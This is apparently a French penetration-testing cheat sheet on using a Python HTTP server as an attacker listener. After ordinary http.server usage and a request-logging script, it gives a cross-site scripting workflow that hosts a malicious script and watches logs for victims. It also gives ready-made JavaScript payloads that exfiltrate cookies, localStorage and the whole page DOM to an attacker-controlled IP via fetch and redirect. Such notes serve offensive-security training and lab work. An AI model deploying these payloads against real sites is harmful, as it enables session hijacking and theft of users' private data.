# 7. Serveur HTTP Python

## 7.1 Héberger Fichiers

**Lancer serveur HTTP sur port 80 :**

```bash
python3 -m http.server 80
```

**Comportement :**

- Sert fichiers du répertoire courant
- Accessible via `http://<IP>:80/`
- Logs chaque requête

**Exemple logs :**

```
192.168.56.101 - - [12/Jan/2026 12:31:09] "GET /xss.js HTTP/1.1" 200 -
192.168.56.101 - - [12/Jan/2026 12:31:09] "GET /exfil?data=cookie HTTP/1.1" 404 -
```

### 7.1.1 serveur python plus complet

```python
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import sys

class VerboseHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Désactive le log par défaut
        pass
    
    def do_GET(self):
        self.handle_request()
    
    def do_POST(self):
        self.handle_request()
    
    def do_PUT(self):
        self.handle_request()
    
    def do_DELETE(self):
        self.handle_request()
    
    def handle_request(self):
        print("\n" + "="*60)
        print(f"[+] {self.command} {self.path}")
        print("="*60)
        
        # Headers
        print("\n[HEADERS]")
        for header, value in self.headers.items():
            print(f"  {header}: {value}")
        
        # Body (si POST/PUT)
        if self.command in ['POST', 'PUT']:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 0:
                body = self.rfile.read(content_length)
                print("\n[BODY]")
                try:
                    print(body.decode('utf-8'))
                except:
                    print(f"Binary data ({len(body)} bytes)")
        
        print("\n" + "="*60 + "\n")
        
        # Réponse
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"OK")

def run(port=80):
    server_address = ('', port)
    httpd = HTTPServer(server_address, VerboseHandler)
    print(f'[*] Serveur démarré sur port {port}')
    print(f'[*] Écoute sur http://0.0.0.0:{port}')
    print('[*] Ctrl+C pour arrêter\n')
    httpd.serve_forever()

if __name__ == '__main__':
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 80
    run(port)
```


le lancer
```python
sudo python3 python_server.py
```

---

### 7.1.2 Port personnalisé :

```bash
python3 -m http.server 8000
python3 -m http.server 8080
```

---

### 7.1.3 Bind sur IP spécifique :

```bash
python3 -m http.server 8000 --bind 192.168.1.100
python3 -m http.server 8000 -b 0.0.0.0  # Toutes interfaces
```

---

### 7.1.4Directory spécifique :

```bash
python3 -m http.server 8000 --directory /path/to/dir
```


---
## 7.2 Workflow XSS avec Serveur HTTP

**Préparation :**

```bash
# création du fichier avec script, et lancement du serveur pour l'héberger
mkdir xss
cd xss
echo "alert(1)" > xss.js
python3 -m http.server 80
```

**Payload XSS :**

```html
<script src="http://192.168.49.56/xss.js"></script>
```

**Observation :**

- Logs montrent qui charge le script
- Première ligne = toi (test)
- Lignes suivantes = victimes

**Exfiltration XSS universelle :**
``` javascript
window.location.href = "http://KALI-IP/?data=" + btoa(document.body.innerHTML);
```

---

## 7.3 Exfiltration Données

**Exfiltration XSS universelle :**
``` javascript
window.location.href = "http://KALI/?data=" + btoa(document.body.innerHTML);
```

**Script xss.js pour cookies :**

```javascript
let cookie = document.cookie
let encodedCookie = encodeURIComponent(cookie)
fetch("http://192.168.49.56/exfil?data=" + encodedCookie)
```

**Logs reçus :**

```
192.168.56.101 - - [12/Jan/2026] "GET /exfil?data=session%3DSomeExampleCookie HTTP/1.1" 404
```

**Decoder URL :**

```
session%3DSomeExampleCookie
→ session=SomeExampleCookie
```

---

**Script pour localStorage :**

```javascript
let data = JSON.stringify(localStorage)
let encodedData = encodeURIComponent(data)
fetch("http://192.168.49.56/exfil?data=" + encodedData)
```

---

**Script pour DOM complet :**

```javascript
let dom = document.documentElement.outerHTML
let encodedDom = encodeURIComponent(dom)
fetch("http://192.168.49.56/exfil?data=" + encodedDom)
```

---
